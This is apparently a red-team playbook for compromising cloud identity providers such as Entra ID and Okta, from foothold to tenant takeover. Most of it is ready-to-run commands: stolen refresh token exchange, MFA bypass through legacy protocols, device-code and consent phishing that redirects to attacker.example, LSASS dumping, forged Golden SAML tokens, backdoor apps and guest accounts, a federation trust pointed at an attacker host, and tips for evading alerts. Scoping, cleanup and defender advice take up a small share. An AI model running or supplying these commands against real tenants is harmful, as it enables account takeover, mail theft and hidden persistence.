# Cloud Identity Provider Attack Playbook — End-to-End Red Team Workflow Guide

> Deep-dive companion to `skills/cloud-identity-attack/SKILL.md`.
>
> Audience: red teamers and security engineers who know what OAuth, OIDC, SAML, and a refresh token are, and want a battle-tested playbook for taking a modern cloud identity provider (Azure AD/Entra ID, Okta, Auth0, Ping, AWS IAM Identity Center, Google Workspace) from initial foothold to full tenant compromise and cross-cloud pivot — without missing the bug that takes down the company.

---

## 1. Why a Workflow, Not Just Commands

A `curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me` returns a user profile in 200ms. The trap is treating that response as the assessment. A defensible cloud identity red team engagement requires:

1. **Scope confirmation** — what IdPs are authorized? Production tenants or test tenants? Are user-targeted social engineering techniques (device code phishing, consent grant phishing, MFA fatigue) in scope, or is this infrastructure-only?
2. **Foothold verification** — is the harvested token still valid? Has the user's session been revoked? Is the tenant still the one in scope?
3. **Tenant reconnaissance** — what's the IdP type? Federation config? Conditional Access posture? PIM eligibility?
4. **User/group enumeration** — who exists, who has what role, what apps are integrated?
5. **Token acquisition strategy** — what's the highest-priv token reachable given the foothold?
6. **Conditional Access bypass** — what policy layer exists, and what bypass classes apply?
7. **Privilege escalation** — can the foothold identity escalate via PIM, app-owner, role assignment?
8. **Cross-cloud pivot** — does the IdP federate to AWS / GCP / SaaS? Can we pivot?
9. **Persistence** — what backdoor will survive the defender's response?
10. **Detection evasion + cleanup** — what's the audit footprint of every action, and how do we leave the tenant as we found it?

This guide walks through all ten, in order, with the exact commands, decision points, and references.

---

## 2. Pre-Flight: Scope & Authorization

Before any active exploitation, answer these — in writing, in the statement of work or rules of engagement:

- **What IdPs are in scope?** Entra ID? Okta? Auth0? Ping? AWS IAM Identity Center? Google Workspace? Each is a different engagement shape and different technical surface.
- **Test tenant or production?** Microsoft 365 Developer Program gives a free E5 tenant. Okta Developer gives a free Okta tenant. Use these. Never test against production without explicit written authorization and a maintenance window.
- **Are user-targeted techniques in scope?** Device code phishing, illicit consent grant phishing, and MFA fatigue target real users. Some engagements are infrastructure-only (e.g., "given a stolen refresh token, demonstrate impact"). Confirm before user contact.
- **Are federation compromise techniques in scope?** Forging SAML from a stolen AD FS token-signing cert is destructive to the federation trust fabric. Get explicit authorization for federation trust tampering.
- **Is cross-cloud pivot in scope?** Pivoting from Entra ID to AWS via IAM Identity Center crosses from "the IdP engagement" into "the AWS account engagement" — usually a different ruleset and contractual scope. Confirm before crossing.
- **What's the blast-radius ceiling?** No new app registrations? No federation trust changes? No PIM activations? No mail reading? Set clear limits.
- **What's the deliverable?** Internal report? Customer-facing? Regulator-facing? Different deliverables have different severity rubrics and disclosure timelines.
- **What's the timeline?** A 3-day triage finds different bugs than a 4-week red team engagement. Set expectations.

If any of these are unclear, stop and resolve before proceeding. Federation trust tampering and cross-cloud pivots are the two most common "we didn't realize that was in scope" escalations.

---

## 3. Phase 1: Foothold Verification

The first 15 minutes of any engagement are about confirming the foothold is real. Many reported "compromised tenants" turn out to be stale tokens, expired sessions, or test tenants that were torn down.

### 3.1 From a stolen OAuth refresh token

```bash
# Decode the refresh token's prefix to identify the issuer
echo $REFRESH_TOKEN | head -c 50

# Microsoft refresh tokens start with "0.AXAA." or "M.C5_BAY."
# Okta refresh tokens are opaque UUID-like strings
# Google refresh tokens start with "1//"

# For Microsoft: exchange the refresh token for an access token
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://graph.microsoft.com/.default offline_access"
# client_id 1950a258-... = Microsoft Graph PowerShell — wide scope

# If 200: foothold confirmed. Decode the access token.
echo $ACCESS_TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .

# If 400 invalid_grant: token has been revoked or expired. Stop.
# If 400 invalid_client: client_id mismatch. Try a different first-party app id.

# Verify by calling /me
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me
# 200 with user profile: foothold confirmed.
```

### 3.2 From a stolen Okta API token

```bash
# Okta tokens are SSWS format: SSWS <base64(api-token-id:secret)>
export OKTA_API_TOKEN="SSWS 00xxxxxxxxxxxxxxxxxx"

# Verify
curl -s -H "Authorization: $OKTA_API_TOKEN" https://corp.okta.com/api/v1/users/me
# 200 with admin user info: foothold confirmed.
# 401: token revoked. Stop.
```

### 3.3 From an Entra ID user credential

```bash
# Test the credential
az login --use-device-code --tenant corp.com -u victim@corp.com -p 'P@ssw0rd'
# If 200: foothold confirmed.
# If AADSTS50076: MFA required — credential is valid but needs second factor.
# If AADSTS50053: account locked.
# If AADSTS50126: invalid credential.
```

### 3.4 From unauthenticated external position

```bash
# Tenant reconnaissance without creds
curl -s https://login.microsoftonline.com/corp.com/.well-known/openid-configuration | jq .issuer
# 200 with valid issuer: tenant exists, can be enumerated.

# Realm discovery — federated or managed?
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=victim@corp.com&xml=1"
# NameSpaceType=Federated → AD FS / Okta / Ping handles auth
# NameSpaceType=Managed → Entra ID handles auth
```

If the foothold is real, proceed to Phase 2. If not, return to the engagement lead and re-acquire.

---

## 4. Phase 2: Tenant Reconnaissance

Now you have a foothold. Time to map the tenant.

### 4.1 IdP type and configuration

```bash
# Azure AD/Entra ID: tenant GUID + domains
Import-Module AADInternals
Get-AADIntTenantDomains -Domain corp.com
# Returns: GUID, verified domains, federated domains, custom domains

# Okta: tenant URL
# <tenant>.okta.com or custom domain via /well-known/openid-configuration
curl -s https://corp.okta.com/.well-known/openid-configuration | jq .issuer

# Google Workspace: domain config
curl -s "https://accounts.google.com/.well-known/openid-configuration" | jq

# Auth0: tenant metadata
curl -s https://corp.auth0.com/.well-known/openid-configuration | jq
```

### 4.2 Federation map

```bash
# Entra ID federations (trusts with other IdPs)
az rest --method get --url "https://graph.microsoft.com/v1.0/domains?\$select=id,authenticationType,isVerified,isDefault"
# authenticationType=Federated → federated with on-prem AD FS, Okta, Ping, etc.

# Pull federation metadata for federated domains
curl -s "https://login.microsoftonline.com/<federated-domain>/FederationMetadata/2007-06/FederationMetadata.xml"
# Extract: issuer, signing cert, endpoints, claim types
```

### 4.3 Conditional Access posture (if readable)

```bash
# List CA policies (requires CA Admin or Global Admin)
az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  | jq '.value[] | {displayName, state, grantControls, conditions}'
# Note: state = enabled | disabled | enabledForReportingButNotEnforced

# For each policy, note:
# - Which users/apps are included
# - Which are EXCLUDED (excluded apps are bypass targets!)
# - What controls are required (mfa, compliantDevice, etc.)
# - Conditions (locations, platforms, risk levels)
```

### 4.4 Identity Secure Score

```bash
# Get identity secure score (high-level posture indicator)
az rest --method get --url "https://graph.microsoft.com/reports/getAzureADTenantSecureScore(period='D30')/content"
# Returns: current score, max score, control scores
```

---

## 5. Phase 3: User/Group/Service Principal Enumeration

### 5.1 Microsoft Graph (modern path)

```bash
# All users
az rest --method get --url "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,jobTitle,department,accountEnabled,createdDateTime" \
  | jq '.value[].userPrincipalName'

# All groups
az rest --method get --url "https://graph.microsoft.com/v1.0/groups?\$select=displayName,description,groupTypes,membershipRule"

# All service principals (apps)
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles,oauth2PermissionScopes"

# Privileged users (Global Admins)
GA_ROLE_ID="62e90394-69f5-4237-9190-012177145e10"
az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=roleDefinitionId eq '$GA_ROLE_ID'&\$expand=principal" \
  | jq '.value[].principal.userPrincipalName'

# All directory role assignments
az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal,roleDefinition"
```

### 5.2 ROADtools comprehensive dump

```bash
# Most comprehensive AAD enumeration tool
python roadrecon auth --device-code --tenant corp.com
python roadrecon gather --roadrecon-auth-file .roadtools_auth
# Outputs roadrecon.db (SQLite) with everything: users, groups, apps, CAs, role assignments, OAuth grants

# GUI for browsing
python roadrecon gui --database roadrecon.db
# Open http://localhost:5000 — pre-built queries:
# - "All Global Admins"
# - "Service Principals with Application.ReadWrite.All"
# - "Conditional Access Policies with excluded apps"
# - "Users with PIM-eligible roles"
```

### 5.3 AzureHound for graph attack paths

```bash
JWT=$(az account get-access-token --resource-type ms-graph --query accessToken -o tsv)

azurehound -j "$JWT" list users > users.json
azurehound -j "$JWT" list groups > groups.json
azurehound -j "$JWT" list serviceprincipals > sps.json
azurehound -j "$JWT" list directoryroles > roles.json
azurehound -j "$JWT" list conditionalaccesspolicies > cas.json

# Import to BloodHound
# Pre-built Azure queries:
# - "Shortest Path to Global Admin"
# - "Service Principals with Role Management"
# - "Users Who Can Reset Any Password"
# - "All Paths from current user to Application Admin"
```

### 5.4 Okta enumeration

```bash
export OKTA_API_TOKEN="SSWS 00xxx..."

# Users
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/users?limit=200" | jq '.[].profile.login'

# Groups (look for admin groups)
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/groups" | jq '.[].profile.name'

# Apps (integrated apps)
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/apps" | jq '.[].label'

# Sign-on policies
curl -s -H "Authorization: $OKTA_API_TOKEN" "https://corp.okta.com/api/v1/policies?type=OKTA_SIGN_ON" | jq
```

---

## 6. Phase 4: Token Acquisition Strategy

This is the heart of cloud identity attacks. Choose the right token acquisition path based on the foothold.

### 6.1 Decision tree

```
Do you have a refresh token?
├── Yes → Exchange for access tokens (broad scope via "offline_access")
│        → §6.2
└── No → Do you have user credentials?
    ├── Yes, password works without MFA → Direct password auth
    │                                    → Use legacy auth if MFA blocks modern
    │                                    → §6.3 (MFASweep)
    ├── Yes, password + MFA required → Phish MFA via device code
    │                                → §6.4
    └── No credentials → Phish via device code OR illicit consent grant
                         → §6.4 or §6.5
```

### 6.2 Refresh token exchange

```bash
# A single Microsoft refresh token (with offline_access) can be exchanged
# for access tokens for many different Microsoft first-party apps.
# Each exchange produces an access token scoped to that app's audience.

# Exchange for Microsoft Graph (broad scopes)
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://graph.microsoft.com/.default offline_access"

# Exchange for Outlook (mail)
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://outlook.office.com/.default offline_access"
# client_id d3590ed6-... = Microsoft Office

# Exchange for Azure CLI (Azure RM)
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://management.azure.com/.default offline_access"
# client_id 04b07795-... = Azure CLI

# Exchange for Teams
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "scope=https://api.spaces.skype.com/.default offline_access"
# client_id 1fec8e78-... = Microsoft Teams
```

### 6.3 Legacy auth bypass via MFASweep

```powershell
Import-Module /opt/MFASweep/MFASweep.ps1
Invoke-MFASweep -Username "victim@corp.com" -Password "P@ssw0rd"
# Output per service: which require MFA, which don't

# If EAS doesn't require MFA:
curl -X POST "https://outlook.office365.com/Microsoft-Server-ActiveSync" \
  -u "victim@corp.com:P@ssw0rd" -H "MS-ASProtocolVersion: 14.0"

# If EWS doesn't require MFA:
curl -X POST "https://outlook.office365.com/EWS/Exchange.asmx" \
  -u "victim@corp.com:P@ssw0rd" -H "Content-Type: text/xml" -d @ews_request.xml

# If IMAP doesn't require MFA:
swaks --to victim@corp.com --server outlook.office365.com:993 \
  --auth LOGIN --auth-user victim@corp.com --auth-password 'P@ssw0rd' -tls --port 993
```

### 6.4 Device code phishing (TokenTactics / ROADtools)

```bash
# Attacker initiates device code flow targeting Microsoft Graph
python roadrecon auth --device-code --tenant corp.com
# Output: code ABCDE1234 + URL https://microsoft.com/devicelogin

# Or target a specific app with TokenTactics
cd /opt/TokenTactics
python tokenTactics.py get-token --client microsoftgraph --tenant corp.com
python tokenTactics.py get-token --client outlook --tenant corp.com
python tokenTactics.py get-token --client teams --tenant corp.com

# Phish the code to the victim (email, Teams, fake login page)
# Victim completes auth → attacker receives tokens
```

### 6.5 Illicit consent grant

```bash
# Construct admin consent URL
ADMIN_CONSENT_URL="https://login.microsoftonline.com/organizations/v2.0/adminconsent"
CLIENT_ID="<attacker-app-id>"
REDIRECT_URI="https://attacker.example/callback"
SCOPES="https://graph.microsoft.com/Mail.Read offline_access"
CONSENT_URL="${ADMIN_CONSENT_URL}?client_id=${CLIENT_ID}&scope=${SCOPES}&redirect_uri=${REDIRECT_URI}"

# Phish victim to consent URL
# Victim consents → Microsoft redirects to attacker.example/callback?code=<auth-code>
# Attacker exchanges code for tokens
```

### 6.6 Primary Refresh Token (PRT) theft

```powershell
# Requires foothold on a Windows endpoint joined to Entra ID
Import-Module AADInternals

# Extract PRT from local device (requires admin on the box)
Get-AADIntUserPRT

# Use PRT to acquire tokens
$prt = "<prt-base64>"
$sessionKey = "<key-base64>"
$tokens = Get-AADIntAccessTokenWithPRT -PRT $prt -SessionKey $sessionKey -Resource "https://graph.microsoft.com"
```

---

## 7. Phase 5: Conditional Access Bypass

### 7.1 Identify CA policies

```bash
az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  | jq '.value[] | {displayName, state, includedApps: .conditions.applications.includeApplications, excludedApps: .conditions.applications.excludeApplications, grantControls}'
```

### 7.2 Bypass classes

| Bypass Class | Technique | When it works |
|--------------|-----------|---------------|
| Legacy auth | IMAP/POP/EAS/SMTP basic auth | CA only applies to modern auth; tenant hasn't blocked legacy |
| Excluded app | Find app in `excludeApplications` | Common for service apps that can't do MFA |
| MFA fatigue | Push-bomb until user approves | Push-based MFA without number-matching |
| Location spoof | Route via trusted location | Apple iCloud Private Relay, residential proxies, foothold in trusted country |
| Device state | Clone a compliant device cert, register fake device | Device-based CA without Intune attestation |
| Risk-based | Sign in from low-risk IP / clean user agent | Risk-based CA with weak thresholds |
| Service principal | App-only auth (client credentials) | CA only applies to users, not service principals |

### 7.3 Test each bypass

```bash
# Legacy auth
Invoke-MFASweep -Username victim@corp.com -Password 'P@ssw0rd'

# Excluded app: enumerate apps in policies, then auth to them
EXCLUDED_APP_ID=$(az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" | jq -r '.value[].conditions.applications.excludeApplications[]' | sort -u | head -1)
# Then sign in using that app's client_id

# MFA fatigue: spam authn endpoints
for i in $(seq 1 20); do
  curl -s -X POST "https://corp.okta.com/api/v1/authn" \
    -H "Content-Type: application/json" \
    -d '{"username":"victim@corp.com"}' &
done; wait

# Location spoof: residential proxy
export HTTPS_PROXY="http://user:pass@residential.brightdata.com:22225"
az login --use-device-code

# Service principal: register an app with client credentials, use it
# (See §9 Persistence: backdoor app registration)
```

---

## 8. Phase 6: Lateral Movement via App Registrations

### 8.1 Find over-privileged service principals

```bash
# Service principals with high-privilege app roles
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles,oauth2PermissionScopes,requiredResourceAccess" \
  | jq '.value[] | select(.appRoles[].value == "Application.ReadWrite.All" or .appRoles[].value == "RoleManagement.ReadWrite.Directory" or .appRoles[].value == "Mail.ReadWrite")'

# Find app role assignments (who has been granted the role)
az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals/<id>/appRoleAssignedTo"
```

### 8.2 App owner escalation

```bash
# If you're an owner of an app, you can add a new secret and use the app's perms
az rest --method get --url "https://graph.microsoft.com/v1.0/applications/<app-id>/owners" \
  | jq '.value[].userPrincipalName'

# As owner:
az ad app credential reset --id <app-id> --append
# Now use the app via client credentials flow
```

### 8.3 Service principal → user escalation

```bash
# Some service principals can impersonate users via app-only tokens
# Or: service principal with RoleManagement.ReadWrite.Directory can grant itself user roles
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{"@odata.type":"#microsoft.graph.unifiedRoleAssignment","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","principalId":"<your-sp-id>","directoryScopeId":"/"}'
# 62e90394-... = Global Admin
```

---

## 9. Phase 7: Federation Compromise (Golden SAML)

### 9.1 Extract AD FS token-signing certificate

```powershell
# Prerequisites: Domain Admin on the AD FS server (or DKM path)
# ADFSDump / ADFSDump-LL extract the signing cert from the AD FS config DB

# Method A: Direct dump from AD FS server (as admin)
Import-Module AADInternals
Export-AADIntADFSConfiguration -ServerName localhost

# Method B: Extract from DKM container via DA
Get-AADIntADFSKeys -Server "corp-dc01"

# Method C: LSASS dump on AD FS server
procdump -ma lsass.exe lsass.dmp
pypykatz offline lsass.dmp
# Look for ADFS service account credentials → use them to read AD FS config

# Method D: Mandiant ADFSDump-LL
# https://github.com/mandiant/ADFSDump-LL
```

### 9.2 Forge Golden SAML

```powershell
Import-Module AADInternals

$cert = Import-PfxCertificate -FilePath TokenSigning.pfx -Password (ConvertTo-SecureString 'pfxpassword' -AsPlain -Force)

$token = New-AADIntSAMLToken -ImmutableId 'victim@corp.com' `
  -Issuer 'http://adfs.corp.com/adfs/services/trust' `
  -Certificate $cert `
  -Audience 'urn:federation:MicrosoftOnline' `
  -Expiry (Get-Date).AddHours(2) `
  -MFA -IncludeAuthenticationMethod

Open-AADIntOffice365Portal -SAMLToken $token
# Result: Entra ID bearer token — bypasses MFA via the forged MFA claim
```

### 9.3 Forge SAML for AWS IAM Identity Center

```bash
# Same pattern, different audience
# Forge SAML with audience https://signin.aws.amazon.com/saml
# Include Role attribute: arn:aws:iam::<acct>:saml-provider/<IdP>,arn:aws:iam::<acct>:role/<Role>

aws sts assume-role-with-saml \
  --role-arn "arn:aws:iam::111122223333:role/MyRole" \
  --principal-arn "arn:aws:iam::111122223333:saml-provider/EntraId" \
  --saml-assertion "$(base64 -w0 forged.xml)" \
  --duration-seconds 3600
```

---

## 10. Phase 8: Persistence

### 10.1 Backdoor app registration

```bash
# Create app with Mail.Read, consent as GA, use indefinitely
az ad app create --display-name "Contoso-Backup-Sync" \
  --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"024d486e-b451-40bb-833d-3e28d5d60bb0","type":"Scope"}]}]'
az ad sp create --id <app-id>
az ad app credential reset --id <app-id> --append
az ad app permission admin-consent --id <app-id>

# Use via client credentials flow
curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "client_id=<app-id>&client_secret=<secret>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
```

### 10.2 Guest user backdoor

```bash
# Invite attacker-controlled account
az rest --method post --url "https://graph.microsoft.com/v1.0/invitations" \
  --body '{"invitedUserEmailAddress":"attacker@evil.example","inviteRedirectUrl":"https://myapps.microsoft.com","sendInvitationMessage":false}'

# Add guest to privileged group
GUEST_ID=$(az rest --method get --url "https://graph.microsoft.com/v1.0/users/attacker_evil.example%23EXT%23@corponmicrosoft.com" --query id -o tsv)
az rest --method post --url "https://graph.microsoft.com/v1.0/groups/<ga-group-id>/members/\$ref" \
  --body "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/$GUEST_ID\"}"
```

### 10.3 Federation trust tampering

```powershell
# Add a new SAML federation trust pointing to attacker-controlled IdP
Import-Module AADInternals
Set-AADIntDomainFederation -DomainName 'corp.com' `
  -IssuerUri 'http://adfs.corp.com/adfs/services/trust' `
  -ActiveLogOnUri 'https://attacker.example/adfs/services/trust/2005/usernamemixed' `
  -PassiveLogOnUri 'https://attacker.example/adfs/ls' `
  -SigningCertificate (Get-Content attacker-signing.cer -Raw)

# Future sign-ins to corp.com redirect to attacker.example
# Survives tenant admin password reset because the federation trust is the persistence
```

### 10.4 PIM-eligible elevation backdoor

```bash
# Grant a low-priv user PIM eligibility for Global Admin
az rest --method post --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleRequests" \
  --body '{"action":"AdminAssign","principalId":"<your-id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/","justification":"Backup admin","scheduleInfo":{"startDateTime":"2026-06-17T00:00:00Z","expiration":{"type":"NoExpiration"}}}'
# Persists as "eligible" — only triggers audit when activated
```

---

## 11. Phase 9: Detection Evasion & Cleanup

### 11.1 Minimize audit footprint

```bash
# Every Graph API call is audited. Minimize volume:
# - Use efficient queries ($select, $filter)
# - Use refresh tokens instead of re-authenticating (non-interactive sign-ins are less monitored)
# - Use service principal auth (different audit channel than user auth)
# - Space out actions — bursts trigger UEBA alerts
```

### 11.2 Avoid triggering alerts

| Alert class | Trigger | Avoidance |
|-------------|---------|-----------|
| Impossible travel | Sign-ins from geographically distant IPs within short window | Use a foothold in the user's region |
| New device | Sign-in from device the user hasn't used | Spoof user agent; use refresh token (no new device claim) |
| High-risk sign-in | Real-time risk scoring flags the sign-in | Route via trusted IP; clean user agent |
| Mass enumeration | Many API calls in short time | Throttle; use efficient queries |
| New app consent | User consents to a new app | Don't use consent grants; use existing apps |
| PIM activation | User activates a role | Use persistent roles instead (less audited) |
| Federation trust change | Global Admin modifies federation | Avoid — highest-detection action |

### 11.3 Cleanup checklist

```bash
# Document every change you made for the cleanup phase:
# - App registrations created: <list of app-ids>
# - Service principals created: <list>
# - Consent grants added: <list>
# - Guest users invited: <list>
# - Group memberships modified: <list>
# - Conditional Access policies modified: <list>
# - Federation trust changes: <list>
# - PIM activations: <list>
# - Tokens stolen: <list>

# Cleanup commands:
az ad app delete --id <app-id>
az rest --method delete --url "https://graph.microsoft.com/v1.0/users/<guest-id>"
az rest --method delete --url "https://graph.microsoft.com/v1.0/oauth2PermissionGrants/<grant-id>"
az rest --method post --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" --body '{"action":"AdminRemove",...}'

# Revert federation trust changes (defender should also rotate the IdP signing cert)
# Revoke all refresh tokens issued during engagement
# Defender: rotate AD FS token-signing cert if federation was touched
```

---

## 12. MITRE ATT&CK Cloud Identity Matrix

| Tactic | Technique | This Playbook Section |
|--------|-----------|----------------------|
| Initial Access | T1078.004 Valid Accounts: Cloud Accounts | §3 (foothold verification), §6 (token acquisition) |
| Initial Access | T1189 Drive-by Compromise | §6.5 (illicit consent grant phishing) |
| Initial Access | T1566 Phishing | §6.4 (device code phishing) |
| Persistence | T1098.001 Account Manipulation: Additional Cloud Credentials | §10.1 (backdoor app), §10.2 (guest user) |
| Persistence | T1136 Create Account | §10.2 (guest user invite) |
| Privilege Escalation | T1078.004 Valid Accounts: Cloud Accounts | §8 (app registration abuse), §10.4 (PIM) |
| Privilege Escalation | T1098 Account Manipulation | §8.2 (app owner escalation), §8.3 (SP → user) |
| Defense Evasion | T1550.001 Use Alternate Authentication Material: Application Access Token | §6.2 (refresh token exchange) |
| Defense Evasion | T1550 Use Alternate Authentication Material | §9 (Golden SAML) |
| Credential Access | T1528 Steal Application Access Token | §6 (token acquisition) |
| Credential Access | T1606 Forge Web Credentials | §9 (Golden SAML) |
| Credential Access | T1621 Multi-Factor Authentication Request Generation | §7.3 (MFA fatigue) |
| Discovery | T1087.004 Account Discovery: Cloud Account | §5 (user/group enum) |
| Discovery | T1526 Cloud Service Dashboard | §4 (tenant recon) |
| Lateral Movement | T1550.001 Use Alternate Authentication Material: Application Access Token | §6.2 (token exchange across apps) |
| Collection | T1213 Data from Information Repositories | §6.1 (mail read via Graph) |

---

## 13. Per-IdP Decision Tree

```
What's the target IdP?
│
├── Azure AD / Entra ID
│   ├── Use ROADtools (roadrecon, roadtx) — most mature
│   ├── Use AADInternals for federation work
│   ├── TokenTactics for device code phishing
│   ├── MFASweep for legacy auth bypass
│   ├── AzureHound for graph attack paths
│   └── See SKILL.md Exercise 1-7, 11-12
│
├── Okta
│   ├── Use Okta API directly (curl + SSWS token)
│   ├── For session: create session via /api/v1/sessions?additionalFields=cookieToken
│   ├── For MFA: trigger push via /api/v1/authn
│   ├── For federation: Okta federates with Entra ID — pivot bidirectionally
│   └── See SKILL.md Exercise 8
│
├── Auth0
│   ├── User enum via /dbconnections/signup (timing)
│   ├── Rule / hook injection (requires Auth0 admin)
│   └── See payloads.md §11
│
├── Ping
│   ├── SSH to Ping server, extract p12 from /opt/pingfederate
│   ├── Forge SAML from Ping's signing cert
│   └── See payloads.md §7.2
│
├── AWS IAM Identity Center
│   ├── Forge SAML from upstream IdP (Entra ID / Okta)
│   ├── Assume role via aws sts assume-role-with-saml
│   ├── Or steal IC access token directly
│   └── See SKILL.md Exercise 9
│
└── Google Workspace
    ├── OAuth app abuse (gmail.readonly, drive.readonly)
    ├── Service account + Domain-Wide Delegation
    ├── Admin SDK API with stolen admin creds
    └── See payloads.md §12
```

---

## 14. Report Structure

A cloud identity engagement report should follow this structure:

1. **Executive Summary** — What was the engagement, what was the most significant finding, what's the recommended priority remediation.
2. **Scope** — IdPs in scope, test tenants used, dates, timeline, methodology.
3. **Findings** — Each finding as:
   - Title
   - Severity (LOW / MEDIUM / HIGH / CRITICAL)
   - Description
   - Reproduction steps (with redacted commands)
   - Evidence (screenshots, redacted logs)
   - Impact
   - Remediation
   - References (this playbook sections, MITRE ATT&CK, external resources)
4. **Attack Chain Narrative** — Tell the story end-to-end: how initial foothold → tenant compromise → cross-cloud pivot → persistence.
5. **Strategic Recommendations** — Beyond per-finding remediation:
   - Identity Secure Score targets
   - PIM rollout plan
   - Federation hygiene program
   - Continuous Access Evaluation rollout
   - Identity Protection tuning
6. **Appendix** — Full command list, MITRE ATT&CK mapping, raw evidence.

---

## 15. Quick Reference: Common Commands

```bash
# Tenant recon
curl -s https://login.microsoftonline.com/corp.com/.well-known/openid-configuration | jq .issuer
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=victim@corp.com&xml=1"

# User enum (authenticated)
az rest --method get --url "https://graph.microsoft.com/v1.0/users" | jq '.value[].userPrincipalName'

# Token acquisition
python roadrecon auth --device-code --tenant corp.com
python tokenTactics.py get-token --client microsoftgraph --tenant corp.com

# Refresh token exchange
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2&grant_type=refresh_token&refresh_token=$RT&scope=https://graph.microsoft.com/.default offline_access"

# Read mail
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/messages

# Golden SAML
Import-Module AADInternals
$cert = Import-PfxCertificate -FilePath TokenSigning.pfx -Password (ConvertTo-SecureString 'pfxpassword' -AsPlain -Force)
$token = New-AADIntSAMLToken -ImmutableId 'victim@corp.com' -Issuer 'http://adfs.corp.com/adfs/services/trust' -Certificate $cert -Audience 'urn:federation:MicrosoftOnline' -MFA
Open-AADIntOffice365Portal -SAMLToken $token

# PIM activation
az rest --method post --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" \
  --body '{"action":"AdminAssign","principalId":"<id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/","justification":"IR","scheduleInfo":{"startDateTime":"2026-06-17T12:00:00Z","expiration":{"type":"AfterDuration","duration":"PT4H"}}}'

# Okta user enum
curl -s -H "Authorization: SSWS $OKTA_TOKEN" https://corp.okta.com/api/v1/users | jq '.[].profile.login'

# Okta impersonation
curl -s -X POST -H "Authorization: SSWS $OKTA_TOKEN" -H "Content-Type: application/json" -d '{"userId":"00u1xxx"}' "https://corp.okta.com/api/v1/sessions?additionalFields=cookieToken"

# AWS role assumption via SAML
aws sts assume-role-with-saml --role-arn <role> --principal-arn <provider> --saml-assertion "$(base64 -w0 assertion.xml)"

# Decode JWT
echo $TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
```

---

## 16. Post-Engagement Defender Checklist

After delivering the engagement, recommend the defender implement:

1. **Disable legacy auth** — Block POP3, IMAP, SMTP-AUTH, EAS at the tenant level.
2. **Conditional Access coverage** — Every privileged role covered by CA: MFA, compliant device, sign-in risk < medium.
3. **Continuous Access Evaluation** — Enable CAE for critical apps.
4. **Identity Protection** — User/sign-in risk policies; tune thresholds.
5. **PIM with approval + MFA** — Every privileged role PIM-eligible; max activation 4h.
6. **App registration governance** — Block self-service; require admin consent for high-priv scopes; quarterly review.
7. **Federation hygiene** — AD FS token-signing cert rotation 1-2 years; HSM-backed keys.
8. **MFA hardening** — Number-matching (default since 2023 in MS Authenticator); phishing-resistant MFA (FIDO2) for admins; disable SMS for admins.
9. **Service principal least privilege** — Quarterly audit of appRole assignments; no `Application.ReadWrite.All` for production apps.
10. **Guest user review** — Quarterly review of guests and group memberships.
11. **Audit log retention + SIEM** — 1+ year retention; alerts on new app consent, new federation trust, PIM activation, anomalous sign-ins.
12. **Token replay detection** — Defender for Cloud Apps anomaly detection; block old refresh tokens on policy change.

---

## 17. References

- Microsoft Identity documentation: [learn.microsoft.com/entra](https://learn.microsoft.com/entra)
